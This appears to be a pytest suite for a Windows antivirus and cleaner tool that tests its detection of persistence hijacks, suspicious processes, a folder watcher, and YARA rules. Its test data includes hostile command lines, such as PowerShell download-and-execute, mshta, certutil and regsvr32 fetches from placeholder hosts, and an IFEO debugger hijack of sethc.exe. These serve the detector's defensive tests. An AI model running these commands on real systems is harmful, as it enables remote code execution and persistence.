"""Malware hunt (persistence, processes), folder watcher, protection settings, YARA rules and the extra Antivirus
pages. Fake registry, fake PowerShell and fake process lists: nothing real is read except the Windows folder layout
and, for one test, ClamAV itself (skipped when it is not installed)."""

import json
import os
import types

import pytest
from PySide6.QtCore import Qt

from ddcleaner import clamav, threat_hunt as hunt, traffic, watcher
from ddcleaner.common import SYSTEM_ROOT, SYSTEM32

from test_system_pages import FakeReg, nested, BS
from test_ui_smoke import dialogs, window, FakeRunning  # noqa: F401  (fixtures)


def set_temp(monkeypatch, folder):
    """Make the hunt module see another temporary folder (the real tempfile module stays untouched)."""
    monkeypatch.setattr(hunt, "tempfile", types.SimpleNamespace(gettempdir=lambda: str(folder)))


@pytest.fixture(autouse=True)
def quiet_temp(tmp_path, monkeypatch):
    """The test folders must not count as 'a temporary folder' (pytest may live inside the real Temp)."""
    set_temp(monkeypatch, tmp_path / "__real_temp__")


def make_exe(folder, name="app.exe"):
    path = folder / name
    folder.mkdir(parents=True, exist_ok=True)
    path.write_bytes(b"MZ" + b"\x00" * 64)
    return path


def judge(signer="Acme Corp", packed=False, writers=()):
    return hunt.FileJudge(lambda path, size=0: types.SimpleNamespace(signer=signer),
                          lambda path: types.SimpleNamespace(packed=packed), lambda folder: list(writers))


def service(name, image, start=2, account="LocalSystem", dll=""):
    return {"name": name, "display": name, "image": image, "start": start, "account": account, "dll": dll}


# region Shared checks

def test_programs_in_temp_download_or_public_folders_are_risky(tmp_path, monkeypatch):
    set_temp(monkeypatch, tmp_path / "Temp")
    assert hunt.risky_location(str(tmp_path / "Temp" / "x.exe"))
    assert hunt.risky_location(r"C:\Users\me\Downloads\x.exe")
    assert hunt.risky_location(r"C:\Users\Public\x.exe")
    assert not hunt.risky_location(r"C:\Program Files\App\x.exe")
    assert not hunt.risky_location("")


@pytest.mark.parametrize("command, expected", [
    ("powershell -NoP -W Hidden -enc " + "QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAA==", {"encoded PowerShell command", "hidden window"}),
    ("powershell iex (New-Object Net.WebClient).DownloadString('http://x/y')", {"PowerShell downloads or runs text as code"}),
    ("mshta http://evil.example/a.hta", {"script host or LOLBin fetching a URL"}),
    ("certutil -urlcache -f http://x/a.exe a.exe", {"download through a Windows tool", "script host or LOLBin fetching a URL"}),
    ("regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll", {"script host or LOLBin fetching a URL", "script run through a Windows tool"}),
    ("C:\\Program Files\\App\\app.exe --minimized", set()),
    ("powershell -File C:\\scripts\\backup.ps1", set()),
])
def test_suspicious_command_lines(command, expected):
    assert {reason for reason, _ in hunt.suspicious_command(command)} == expected


def test_unquoted_service_paths_only_count_below_a_drive_root():
    assert hunt.hijackable_prefixes(r"C:\Program Files\X Y\svc.exe /s") == [r"C:\Program Files\X.exe"]
    assert hunt.hijackable_prefixes(r'"C:\Program Files\X Y\svc.exe"') == []
    assert hunt.hijackable_prefixes(r"C:\Tools\svc.exe") == []


def test_file_judge_does_not_judge_windows_files_and_looks_once(tmp_path):
    calls = []
    j = hunt.FileJudge(lambda p, s=0: calls.append(p) or types.SimpleNamespace(signer=""),
                       lambda p: types.SimpleNamespace(packed=False), lambda f: [])
    exe = make_exe(tmp_path)
    assert j.unsigned(str(exe)) and j.unsigned(str(exe)) and len(calls) == 1
    assert not j.unsigned(os.path.join(SYSTEM32, "cmd.exe"))
    assert not j.unsigned(str(tmp_path / "notes.txt"))

# endregion


# region Services and tasks

def test_services_are_flagged_for_the_right_reasons(tmp_path):
    ok = make_exe(tmp_path / "ok")
    flagged = hunt.check_services([
        service("Fine", f'"{ok}"'),
        service("Disabled", f'"{make_exe(tmp_path / "off")}"', start=4),
        service("Gone", f'"{tmp_path / "gone" / "svc.exe"}"'),
        service("GoneManual", f'"{tmp_path / "gone2" / "svc.exe"}"', start=3),
        service("Host", os.path.join(SYSTEM32, "svchost.exe") + " -k netsvcs"),
    ], judge("Acme"))
    assert [(f.title, f.severity) for f in flagged] == [("Gone", hunt.LOOK)]


def test_unsigned_packed_and_writable_services(tmp_path):
    exe = make_exe(tmp_path / "svc")
    one = hunt.check_services([service("Plain", f'"{exe}"')], judge(""))
    assert one[0].severity == hunt.LOOK and one[0].flags == ["Not signed"] and one[0].path == str(exe)
    packed = hunt.check_services([service("Packed", f'"{exe}"')], judge("", packed=True))
    assert packed[0].severity == hunt.SUSPICIOUS
    writable = hunt.check_services([service("Weak", f'"{exe}"')], judge("Acme", writers=["Users"]))
    assert writable[0].severity == hunt.SUSPICIOUS and "standard users" in writable[0].flags[0]
    user_service = hunt.check_services([service("Weak", f'"{exe}"', account="NT AUTHORITY\\LocalService")],
                                       judge("Acme", writers=["Users"]))
    assert user_service == []                      # not elevated: a writable folder matters less


def test_a_service_hosted_dll_is_judged(tmp_path):
    dll = make_exe(tmp_path / "d", "plugin.dll")
    found = hunt.check_services([service("Hosted", os.path.join(SYSTEM32, "svchost.exe") + " -k x", dll=str(dll))],
                                judge(""))
    assert found and found[0].path == str(dll)


def test_service_in_a_temp_folder_is_suspicious(tmp_path, monkeypatch):
    set_temp(monkeypatch, tmp_path / "t")
    exe = make_exe(tmp_path / "t")
    found = hunt.check_services([service("Evil", f'"{exe}"')], judge("Acme"))
    assert found[0].severity == hunt.SUSPICIOUS and "temporary" in found[0].flags[0]


def test_read_services_keeps_win32_services_only():
    key = hunt.SERVICES_KEY
    reg = FakeReg({("HKLM", "64"): nested(key, {
        "Svc": {"Type": 16, "ImagePath": r"C:\a\svc.exe", "Start": 2, "DisplayName": "My service"},
        "Hosted": {"Type": 32, "ImagePath": r"%SystemRoot%\system32\svchost.exe -k x", "Start": 2,
                   "Parameters": {"ServiceDll": r"C:\a\x.dll"}},
        "Driver": {"Type": 1, "ImagePath": r"\SystemRoot\system32\drivers\d.sys", "Start": 1},
        "NoImage": {"Type": 16}})})
    services = {s["name"]: s for s in hunt.read_services(reg)}
    assert set(services) == {"Svc", "Hosted"} and services["Hosted"]["dll"] == r"C:\a\x.dll"
    assert services["Svc"]["display"] == "My service"


def test_tasks_with_encoded_commands_or_missing_programs(tmp_path):
    exe = make_exe(tmp_path / "t")
    ps = os.path.join(SYSTEM32, "WindowsPowerShell", "v1.0", "powershell.exe")
    data = [
        {"Name": "Fine", "Path": "\\", "Exec": str(exe), "Args": "--x", "User": "me", "Level": "Limited"},
        {"Name": "Encoded", "Path": "\\", "Exec": ps, "Args": "-NoP -W Hidden -enc " + "A" * 40, "User": "me", "Level": "Limited"},
        {"Name": "Missing", "Path": "\\", "Exec": str(tmp_path / "gone.exe"), "Args": "", "User": "me", "Level": "Limited"},
        {"Name": "NoAction", "Path": "\\", "Exec": "", "Args": "", "User": "me", "Level": "Limited"},
    ]
    found = {f.title: f for f in hunt.check_tasks(judge("Acme"), lambda script: data)}
    assert set(found) == {"Encoded", "Missing"}
    assert found["Encoded"].severity == hunt.SUSPICIOUS and found["Missing"].flags == ["Program not found"]
    assert hunt.check_tasks(judge(), lambda script: None) == []

    def broken(script):
        raise ValueError("bad json")
    assert hunt.check_tasks(judge(), broken) == []


def test_wmi_subscriptions_ignore_the_windows_default():
    data = [{"Kind": "NTEventLogEventConsumer", "Name": "SCM Event Log Consumer"},
            {"Kind": "CommandLineEventConsumer", "Name": "Updater", "Cmd": "powershell -enc AAAA"},
            {"Kind": "LogFileEventConsumer", "Name": "Logger", "Cmd": "", "Exe": "", "Script": ""}]
    found = {f.title: f.severity for f in hunt.check_wmi(lambda script: data)}
    assert found == {"Updater": hunt.SUSPICIOUS, "Logger": hunt.LOOK}
    assert hunt.check_wmi(lambda script: {}) == []

# endregion


# region Windows settings, hosts, proxy, extensions

def tree(**roots):
    return FakeReg({("HKLM", "64"): roots.get("hklm", {}), ("HKCU", "64"): roots.get("hkcu", {})})


def merge(*parts):
    out: dict = {}
    for part in parts:
        for k, v in part.items():
            if isinstance(v, dict) and isinstance(out.get(k), dict):
                out[k] = merge(out[k], v)
            else:
                out[k] = v
    return out


CLEAN_HKLM = merge(
    nested(hunt.WINLOGON, {"Shell": "explorer.exe", "Userinit": os.path.join(SYSTEM32, "userinit.exe") + ","}),
    nested(hunt.SESSION_MANAGER, {"BootExecute": ["autocheck autochk *"]}),
    nested(hunt.WINDOWS_NT_WINDOWS, {"AppInit_DLLs": "", "LoadAppInit_DLLs": 0}),
    nested(r"SOFTWARE\Classes\exefile\shell\open\command", {"": '"%1" %*'}))


def test_a_clean_windows_has_no_hijack_findings():
    assert hunt.check_hijacks(tree(hklm=CLEAN_HKLM)) == []


def test_hijacked_windows_settings_are_found():
    hklm = merge(
        nested(hunt.WINLOGON, {"Shell": "explorer.exe, evil.exe", "Userinit": r"C:\Windows\system32\userinit.exe,C:\x\bad.exe"}),
        nested(hunt.IFEO, {"sethc.exe": {"Debugger": r"C:\Windows\System32\cmd.exe"},
                           "CompatTelRunner.exe": {"Debugger": r"%windir%\System32\taskkill.exe"},
                           "devenv.exe": {"Debugger": "vsjitdebugger.exe"}, "plain.exe": {"GlobalFlag": 512}}),
        nested(hunt.WINDOWS_NT_WINDOWS, {"AppInit_DLLs": r"C:\x\hook.dll", "LoadAppInit_DLLs": 1}),
        nested(hunt.SESSION_MANAGER, {"BootExecute": ["autocheck autochk *", "evil"], "AppCertDlls": {"x": r"C:\a.dll"}}),
        nested(r"SOFTWARE\Classes\exefile\shell\open\command", {"": r'"C:\x\wrap.exe" "%1"'}))
    hkcu = nested(hunt.WINLOGON, {"Shell": r"C:\x\shell.exe"})
    found = {f.title: f for f in hunt.check_hijacks(tree(hklm=hklm, hkcu=hkcu))}
    assert found["Winlogon Shell"].severity == hunt.SUSPICIOUS and found["Winlogon Userinit"].severity == hunt.SUSPICIOUS
    assert found["Winlogon Shell (current user)"].severity == hunt.SUSPICIOUS
    assert found["Debugger set for sethc.exe"].severity == hunt.SUSPICIOUS
    assert found["Debugger set for CompatTelRunner.exe"].severity == hunt.LOOK      # a blocking tweak, not a hijack
    assert not any("devenv" in t or "plain" in t for t in found)
    assert found["AppInit_DLLs"].severity == hunt.SUSPICIOUS and found["AppCertDlls"].severity == hunt.SUSPICIOUS
    assert found["BootExecute"].severity == hunt.SUSPICIOUS and found["How .exe files open"].severity == hunt.SUSPICIOUS


def test_appinit_dlls_that_are_not_enabled_are_only_worth_a_look():
    hklm = merge(CLEAN_HKLM, nested(hunt.WINDOWS_NT_WINDOWS, {"AppInit_DLLs": r"C:\x\hook.dll", "LoadAppInit_DLLs": 0}))
    assert [f.severity for f in hunt.check_hijacks(tree(hklm=hklm))] == [hunt.LOOK]


def test_hosts_file(tmp_path):
    hosts = tmp_path / "hosts"
    hosts.write_text("# comment\n127.0.0.1 localhost\n::1 localhost\n"
                     "0.0.0.0 ads.tracker.example\n"
                     "0.0.0.0 download.avast.com   # block\n"
                     "93.184.216.34 www.microsoft.com\n"
                     "192.168.1.5 nas.home\n"
                     "10.0.0.1 login.paypal.com update.contoso.example\n", encoding="utf-8")
    found = {(f.title, f.severity) for f in hunt.check_hosts(str(hosts))}
    assert found == {("download.avast.com", hunt.SUSPICIOUS), ("www.microsoft.com", hunt.SUSPICIOUS),
                     ("nas.home", hunt.LOOK), ("login.paypal.com", hunt.SUSPICIOUS),
                     ("update.contoso.example", hunt.LOOK)}
    assert hunt.check_hosts(str(tmp_path / "missing")) == []


def test_proxy_settings():
    key = nested(hunt.INTERNET_SETTINGS, {"ProxyEnable": 1, "ProxyServer": "10.1.1.1:8080", "AutoConfigURL": "http://x/p.pac"})
    found = hunt.check_proxy(tree(hkcu=key))
    assert [f.severity for f in found] == [hunt.LOOK, hunt.LOOK] and "10.1.1.1" in found[0].detail
    assert hunt.check_proxy(tree(hkcu=nested(hunt.INTERNET_SETTINGS, {"ProxyEnable": 0, "ProxyServer": "x"}))) == []


def write_extension(base, ext_id, manifest, locale=None):
    folder = base / "Google" / "Chrome" / "User Data" / "Default" / "Extensions" / ext_id / "1.0_0"
    folder.mkdir(parents=True)
    (folder / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8-sig")
    if locale:
        messages = folder / "_locales" / "en"
        messages.mkdir(parents=True)
        (messages / "messages.json").write_text(json.dumps(locale))
    return folder


def test_extensions_that_read_every_site_and_use_cookies_are_marked(tmp_path):
    write_extension(tmp_path, "aaa", {"name": "__MSG_appName__", "version": "2.0", "default_locale": "en",
                                      "permissions": ["cookies", "storage"], "host_permissions": ["<all_urls>"]},
                    {"appName": {"message": "Coupon Helper"}})
    write_extension(tmp_path, "bbb", {"name": "Dark Mode", "version": "1", "permissions": ["storage"],
                                      "content_scripts": [{"matches": ["https://example.com/*"]}]})
    write_extension(tmp_path, "ccc", {"name": "All sites but harmless", "version": "1", "permissions": ["storage"],
                                      "host_permissions": ["https://*/*"]})
    bad = tmp_path / "Google" / "Chrome" / "User Data" / "Default" / "Extensions" / "ddd" / "1"
    bad.mkdir(parents=True)
    (bad / "manifest.json").write_text("not json")
    found = {f.title: f for f in hunt.check_extensions(str(tmp_path))}
    assert set(found) == {"Coupon Helper", "Dark Mode", "All sites but harmless"}
    assert found["Coupon Helper"].severity == hunt.LOOK and "cookies" in found["Coupon Helper"].flags[0]
    assert found["Dark Mode"].severity == hunt.INFO and found["All sites but harmless"].severity == hunt.INFO
    assert hunt.check_extensions(str(tmp_path / "none")) == []


def test_collect_persistence_runs_every_check_sorted_and_can_stop(tmp_path, monkeypatch):
    monkeypatch.setattr(hunt, "check_hosts", lambda: [hunt.Finding("Hosts file", "x", severity=hunt.LOOK)])
    reg = tree(hklm=merge(CLEAN_HKLM, nested(hunt.SERVICES_KEY, {})), hkcu={})
    seen = []
    result = hunt.collect_persistence(reg, progress=seen.append, judge=judge(), run=lambda script: [],
                                      local_app_data=str(tmp_path))
    assert [f.title for f in result] == ["x"] and len(seen) == 7
    assert hunt.collect_persistence(reg, stop=lambda: True, judge=judge(), run=lambda s: [],
                                    local_app_data=str(tmp_path)) == []

# endregion


# region Processes

def conn(pid, remote, state="Established"):
    return traffic.Connection("TCP", 2, "192.168.1.2", 50000, remote, 443, state, pid)


def run_scan(tmp_path, procs, connections=(), j=None):
    names = {pid: name for pid, (name, _path) in procs.items()}
    paths = {pid: path for pid, (_name, path) in procs.items()}
    return {f.pid: f for f in hunt.scan_processes(
        judge=j or judge("Acme"), names=lambda: names, path_of=lambda pid: paths[pid],
        connections=lambda: list(connections))}


def test_processes_are_judged(tmp_path, monkeypatch):
    set_temp(monkeypatch, tmp_path / "t")
    fine = make_exe(tmp_path / "ok", "tool.exe")
    in_temp = make_exe(tmp_path / "t", "dropper.exe")
    fake_svchost = make_exe(tmp_path / "x", "svchost.exe")
    copy = make_exe(tmp_path / "y", "svchosts.exe")
    real_svchost = os.path.join(SYSTEM32, "svchost.exe")
    procs = {1: ("System", ""), 4: ("System", ""), 10: ("tool.exe", str(fine)), 11: ("dropper.exe", str(in_temp)),
             12: ("svchost.exe", str(fake_svchost)), 13: ("svchosts.exe", str(copy)),
             14: ("svchost.exe", real_svchost), 15: ("ghost.exe", str(tmp_path / "deleted" / "ghost.exe")),
             16: ("secret.exe", "")}
    found = run_scan(tmp_path, procs)
    assert 4 not in found and found[1].severity == hunt.INFO and not found[1].flags
    assert found[10].severity == hunt.INFO and found[10].signer == "Acme"
    assert found[11].severity == hunt.SUSPICIOUS and "temporary" in found[11].flags[0]
    assert found[12].severity == hunt.SUSPICIOUS and "not in the Windows folder" in found[12].flags[0]
    assert found[13].severity == hunt.SUSPICIOUS and "looks like svchost.exe" in found[13].flags[0]
    assert found[14].severity == hunt.INFO and not found[14].flags
    assert found[15].severity == hunt.SUSPICIOUS and "no longer exists" in found[15].flags[0]
    assert found[16].severity == hunt.INFO and "hidden" in found[16].flags[0]


def test_unsigned_processes_and_the_internet(tmp_path):
    exe = make_exe(tmp_path, "tool.exe")
    quiet = run_scan(tmp_path, {1: ("tool.exe", str(exe))}, j=judge(""))
    assert quiet[1].severity == hunt.LOOK and quiet[1].flags == ["Not signed"]
    online = run_scan(tmp_path, {1: ("tool.exe", str(exe))},
                      [conn(1, "8.8.8.8"), conn(1, "1.1.1.1"), conn(1, "192.168.1.9"), conn(1, "8.8.4.4", "Listen")],
                      j=judge(""))
    assert online[1].severity == hunt.SUSPICIOUS and online[1].connections == 2
    assert any("Internet" in f for f in online[1].flags)
    signed = run_scan(tmp_path, {1: ("tool.exe", str(exe))}, [conn(1, "8.8.8.8")], j=judge("Acme"))
    assert signed[1].severity == hunt.INFO and signed[1].connections == 1


def test_processes_can_be_stopped_and_sorted_worst_first(tmp_path):
    exe = make_exe(tmp_path, "tool.exe")
    assert hunt.scan_processes(stop=lambda: True, judge=judge(), names=lambda: {5: "a.exe"},
                               path_of=lambda p: str(exe), connections=lambda: []) == []
    result = hunt.scan_processes(judge=judge(""), names=lambda: {5: "a.exe", 6: "b.exe"},
                                 path_of=lambda p: str(exe) if p == 5 else str(tmp_path / "gone.exe"),
                                 connections=lambda: [])
    assert [f.pid for f in result] == [6, 5]


def test_lookalike_names_do_not_accuse_real_programs():
    assert hunt._lookalike("svchosts.exe") == "svchost.exe"
    assert hunt._lookalike("svchost.exe") == ""
    for honest in ("chrome.exe", "Code.exe", "python.exe", "steamwebhelper.exe", "msedgewebview2.exe", "OneDrive.exe",
                   "SearchProtocolHost.exe", "backgroundTaskHost.exe", "RuntimeBroker.exe", "ShellExperienceHost.exe"):
        assert hunt._lookalike(honest) == "", honest


def test_program_paths_lists_existing_files_once(tmp_path):
    exe = make_exe(tmp_path)
    paths = hunt.program_paths([hunt.Finding("Service", "a", path=str(exe)), hunt.Finding("Hosts file", "b")],
                               [hunt.ProcessFinding(1, "app.exe", str(exe)), hunt.ProcessFinding(2, "x", str(tmp_path / "no.exe"))])
    assert paths == [str(exe)]

# endregion


# region Folder watcher

def test_a_new_file_is_reported_once_it_stops_changing(tmp_path):
    (tmp_path / "old.zip").write_bytes(b"old")
    w = watcher.FolderWatcher([str(tmp_path)])
    w.prime()
    assert w.poll() == []
    new = tmp_path / "new.exe"
    new.write_bytes(b"1")
    assert w.poll() == []                      # seen once: maybe still being written
    new.write_bytes(b"12")
    assert w.poll() == []                      # it changed: wait again
    assert w.poll() == [str(new)]              # same size and time twice in a row
    assert w.poll() == []                      # never reported twice


def test_partial_downloads_and_lock_files_are_ignored_until_renamed(tmp_path):
    w = watcher.FolderWatcher([str(tmp_path)])
    w.prime()
    (tmp_path / "movie.mkv.crdownload").write_bytes(b"x")
    (tmp_path / "~$doc.docx").write_bytes(b"x")
    assert w.poll() == [] and w.poll() == []
    (tmp_path / "movie.mkv.crdownload").rename(tmp_path / "movie.mkv")
    w.poll()
    assert w.poll() == [str(tmp_path / "movie.mkv")]


def test_a_replaced_file_is_reported_again_and_a_deleted_one_forgotten(tmp_path):
    f = tmp_path / "tool.exe"
    f.write_bytes(b"v1")
    w = watcher.FolderWatcher([str(tmp_path)])
    w.prime()
    f.write_bytes(b"version two")
    w.poll()
    assert w.poll() == [str(f)]
    f.unlink()
    w.poll()
    assert str(f) not in w.known
    f.write_bytes(b"back")
    w.poll()
    assert w.poll() == [str(f)]


def test_subfolders_are_watched_to_a_depth_limit(tmp_path):
    deep = tmp_path / "a" / "b" / "c" / "d"
    deep.mkdir(parents=True)
    shallow = tmp_path / "a" / "x.exe"
    w = watcher.FolderWatcher([str(tmp_path)], max_depth=2)
    w.prime()
    (deep / "hidden.exe").write_bytes(b"1")
    shallow.write_bytes(b"1")
    w.poll()
    assert w.poll() == [str(shallow)]


def test_a_missing_or_relative_folder_is_harmless(tmp_path):
    w = watcher.FolderWatcher([str(tmp_path / "nope"), "relative"])
    w.prime()
    assert w.poll() == []

# endregion


# region Settings and rules

def test_settings_round_trip_and_bad_files(tmp_path):
    path = str(tmp_path / "sub" / "protection.json")
    assert watcher.load_settings(path) == watcher.ProtectionSettings()
    saved = watcher.ProtectionSettings(True, [r"C:\Users\me\Downloads"], 6, 123.0)
    assert watcher.save_settings(saved, path) == "" and watcher.load_settings(path) == saved
    open(path, "w").write("not json")
    assert watcher.load_settings(path) == watcher.ProtectionSettings()
    open(path, "w").write(json.dumps({"watch_enabled": True, "folders": ["relative", r"C:\ok", 5],
                                      "scan_hours": "many", "last_quick_scan": None}))
    loaded = watcher.load_settings(path)
    assert loaded.watch_enabled and loaded.folders == [r"C:\ok"] and loaded.scan_hours == 0
    open(path, "w").write(json.dumps({"scan_hours": 99999}))
    assert watcher.load_settings(path).scan_hours == 24 * 30


def test_the_schedule():
    s = watcher.ProtectionSettings(scan_hours=2, last_quick_scan=1000.0)
    assert not watcher.scan_is_due(s, now=1000.0 + 3600) and watcher.scan_is_due(s, now=1000.0 + 7200)
    assert not watcher.scan_is_due(watcher.ProtectionSettings(scan_hours=0), now=10 ** 9)


RULE = 'rule demo { strings: $a = "EVIL_MARKER_123" condition: $a }\n'


def test_rule_files_are_checked_copied_listed_and_removed(tmp_path):
    folder = str(tmp_path / "db")
    good = tmp_path / "demo.yar"
    good.write_text(RULE)
    assert watcher.add_rule_file(str(good), folder) == "" and watcher.list_rule_files(folder) == ["demo.yar"]
    assert "already installed" in watcher.add_rule_file(str(good), folder)
    assert watcher.remove_rule_file("..\\evil.yar", folder) and watcher.remove_rule_file("other.yar", folder)
    assert watcher.remove_rule_file("demo.yar", folder) == "" and watcher.list_rule_files(folder) == []


@pytest.mark.parametrize("name, content", [("notes.txt", RULE), ("empty.yar", ""), ("text.yar", "hello world"),
                                           ("binary.yar", "rule x\x00 y")])
def test_things_that_are_not_rules_are_refused(tmp_path, name, content):
    f = tmp_path / name
    f.write_text(content)
    assert watcher.add_rule_file(str(f), str(tmp_path / "db"))
    assert watcher.list_rule_files(str(tmp_path / "db")) == []


def test_clamav_has_the_last_word_on_a_rule_file(tmp_path):
    f = tmp_path / "demo.yar"
    f.write_text(RULE)
    install = clamav.Install("x", "clamscan.exe", "freshclam.exe")

    def run(output, code=0):
        return lambda *a, **k: types.SimpleNamespace(returncode=code, stdout=output, stderr="")
    ok = watcher.check_rule_with_clamav(install, str(f), run("Known viruses: 1\n"))
    assert ok == ""
    nothing = watcher.check_rule_with_clamav(install, str(f), run("LibClamAV Warning: cli_loadyara: failed to parse\nKnown viruses: 0\n"))
    assert "failed" in nothing
    assert "ClamAV cannot load" in watcher.add_rule_file(str(f), str(tmp_path / "db"), install, run("Known viruses: 0\n"))
    assert not os.path.exists(tmp_path / "db" / "demo.yar")


@pytest.mark.skipif(clamav.find_install()[0] is None, reason="ClamAV is not installed")
def test_real_clamscan_loads_and_applies_a_yara_rule(tmp_path):
    import subprocess
    install = clamav.find_install()[0]
    good, bad = tmp_path / "good.yar", tmp_path / "bad.yar"
    good.write_text(RULE)
    bad.write_text("rule broken { strings: $a = condition: $a ")
    assert watcher.check_rule_with_clamav(install, str(good)) == ""
    assert watcher.check_rule_with_clamav(install, str(bad))
    db = tmp_path / "db"
    assert watcher.add_rule_file(str(good), str(db), install) == ""
    sample = tmp_path / "s.txt"
    sample.write_text("xx EVIL_MARKER_123 xx")
    done = subprocess.run([install.clamscan, f"--database={db}", "--stdout", str(sample)], capture_output=True, text=True)
    assert done.returncode == 1 and "YARA.demo" in done.stdout
    assert not clamav.read_database_info(str(db)).ready      # rules alone do not replace the signature database

# endregion


# region The pages

def rows(tree_widget):
    return [tree_widget.topLevelItem(i) for i in range(tree_widget.topLevelItemCount())]


def test_antivirus_tab_has_the_new_pages(window):  # noqa: F811
    names = [window.clam_pages.tabText(i) for i in range(window.clam_pages.count())]
    assert names == ["Scan", "Quarantine", "Signature update", "Processes", "Persistence", "Protection"]


def test_process_page_shows_flagged_rows_first_and_can_show_all(window):  # noqa: F811
    window._on_processes_scanned([
        hunt.ProcessFinding(10, "evil.exe", r"C:\Users\x\Downloads\evil.exe", "", 2, ["Not signed"], hunt.SUSPICIOUS),
        hunt.ProcessFinding(11, "calc.exe", r"C:\Windows\calc.exe", "Microsoft", 0, [], hunt.INFO)], "")
    assert [r.text(0) for r in rows(window.process_tree)] == ["evil.exe"]
    assert "1 suspicious" in window.process_summary.text()
    assert rows(window.process_tree)[0].foreground(0).color().red() == 255
    window.process_flagged_cb.setChecked(False)
    assert len(rows(window.process_tree)) == 2


def test_persistence_page_lists_findings_and_filters_information(window):  # noqa: F811
    window._on_hunt_done([hunt.Finding("Service", "Bad", "x", hunt.SUSPICIOUS, flags=["Not signed"]),
                          hunt.Finding("Browser extension", "Dark Mode", "Chrome", hunt.INFO)], "")
    assert [r.text(1) for r in rows(window.hunt_tree)] == ["Bad"]
    assert "1 suspicious" in window.hunt_summary.text() and "1 for information" in window.hunt_summary.text()
    window.hunt_flagged_cb.setChecked(False)
    assert len(rows(window.hunt_tree)) == 2


def test_scanning_programs_hands_existing_files_to_clamav(window, dialogs, tmp_path, monkeypatch):  # noqa: F811
    exe = make_exe(tmp_path)
    started = []
    monkeypatch.setattr(window, "_start_clam_scan", lambda paths, **kw: started.append(paths))
    window._scan_selected_processes()
    assert dialogs["info"]                                          # nothing listed yet
    window._on_processes_scanned([hunt.ProcessFinding(1, "a.exe", str(exe), severity=hunt.LOOK),
                                  hunt.ProcessFinding(2, "b.exe", str(exe), severity=hunt.INFO)], "")
    window._scan_selected_processes()
    assert started == [[str(exe)]] and window._clam_target_paths() == []   # the user's own list is left alone
    window._on_hunt_done([hunt.Finding("Service", "s", path=str(exe), severity=hunt.LOOK)], "")
    started.clear()
    window._scan_hunt_programs()
    assert started == [[str(exe)]]


def test_scanning_is_refused_while_clamav_is_busy(window, dialogs, tmp_path, monkeypatch):  # noqa: F811
    exe = make_exe(tmp_path)
    window.clam_scan_worker = FakeRunning()
    started = []
    monkeypatch.setattr(window, "_start_clam_scan", lambda paths, **kw: started.append(paths))
    window._scan_program_files([str(exe)])
    assert dialogs["info"] and not started


def test_a_quiet_scan_never_shows_a_dialog(window, dialogs):  # noqa: F811
    before = {k: len(dialogs[k]) for k in ("info", "warning", "critical", "question")}
    assert window._start_clam_scan([r"C:\nowhere"], quiet=True) is False        # no database in the test folder
    window.clam_scan_worker = FakeRunning()
    assert window._start_clam_scan([r"C:\nowhere"], quiet=True) is False
    assert {k: len(dialogs[k]) for k in before} == before


class FakeWatcher:
    def __init__(self, batches):
        self.batches = list(batches)

    def poll(self):
        return self.batches.pop(0) if self.batches else []


def test_protection_scans_new_files_when_clamav_is_free(window, tmp_path, monkeypatch):  # noqa: F811
    exe = make_exe(tmp_path)
    started = []
    monkeypatch.setattr(window, "_start_clam_scan", lambda paths, quiet=False, source="": started.append((paths, quiet, source)) or True)
    window.folder_watcher = FakeWatcher([[str(exe)], [], []])
    window._on_watch_polled(window.folder_watcher, window.folder_watcher.poll(), "")   # what the background look hands over
    window.clam_scan_worker = FakeRunning()
    window._protection_tick()
    assert started == [] and window.watch_queue == [str(exe)]       # busy: kept for later
    window.clam_scan_worker = None
    window._protection_tick()
    assert started == [([str(exe)], True, "new files")] and window.watch_queue == []


def test_protection_reports_when_clamav_cannot_scan(window, tmp_path, monkeypatch):  # noqa: F811
    exe = make_exe(tmp_path)
    monkeypatch.setattr(window, "_start_clam_scan", lambda *a, **k: False)
    window.folder_watcher = FakeWatcher([[str(exe)]])
    window._on_watch_polled(window.folder_watcher, window.folder_watcher.poll(), "")
    window._protection_tick()
    assert "not ready" in window.watch_status.text()


def test_watched_folders_are_listed_off_the_gui_thread(window, tmp_path):  # noqa: F811
    from ddcleaner.ui.tab_hunt import watch_step
    folder = tmp_path / "watched"
    folder.mkdir()
    (folder / "old.txt").write_text("there before")
    real = watcher.FolderWatcher([str(folder)])
    real.primed = False
    assert watch_step(real) == [] and real.primed and str(folder / "old.txt") in real.known   # first look: remember
    window.folder_watcher = FakeWatcher([])
    window._on_watch_polled(FakeWatcher([]), ["C:\\stale.exe"], "")      # result of a watcher that was replaced
    window._on_watch_polled(window.folder_watcher, ["C:\\boom.exe"], "listing failed")
    assert window.watch_queue == []


def test_the_scheduled_quick_scan_runs_when_due_and_is_remembered(window, monkeypatch):  # noqa: F811
    started = []
    monkeypatch.setattr(window, "_start_clam_scan", lambda paths, quiet=False, source="": started.append(source) or True)
    window.folder_watcher = None
    window.protection.scan_hours = 1
    window.protection.last_quick_scan = 0
    window._protection_tick()
    assert started == ["the scheduled quick scan"] and window.protection.last_quick_scan > 0
    window._protection_tick()
    assert len(started) == 1                                         # not due again


def test_changing_the_protection_saves_and_rebuilds_the_watcher(window, tmp_path):  # noqa: F811
    folder = tmp_path / "watched"
    folder.mkdir()
    window.watch_list.clear()
    window.watch_list.addItem(str(folder))
    window.schedule_spin.setValue(4)
    window.watch_cb.setChecked(True)
    saved = watcher.load_settings()
    assert saved.watch_enabled and saved.scan_hours == 4 and saved.folders == [str(folder)]
    assert window.folder_watcher is not None and "Watching 1 folder" in window.watch_status.text()
    window.watch_cb.setChecked(False)
    assert window.folder_watcher is None and not watcher.load_settings().watch_enabled


def test_rule_files_appear_in_the_page(window, tmp_path, monkeypatch):  # noqa: F811
    from PySide6.QtWidgets import QFileDialog
    rule = tmp_path / "mine.yar"
    rule.write_text(RULE)
    monkeypatch.setattr(QFileDialog, "getOpenFileName", staticmethod(lambda *a, **k: (str(rule), "")))
    monkeypatch.setattr(window, "clam_install", None, raising=False)
    monkeypatch.setattr(window, "_refresh_clam_status", lambda: None)
    window._add_rule_file()
    assert [window.rule_list.item(i).text() for i in range(window.rule_list.count())] == ["mine.yar"]
    window.rule_list.setCurrentRow(0)
    window._remove_rule_file()
    assert window.rule_list.count() == 0

# endregion
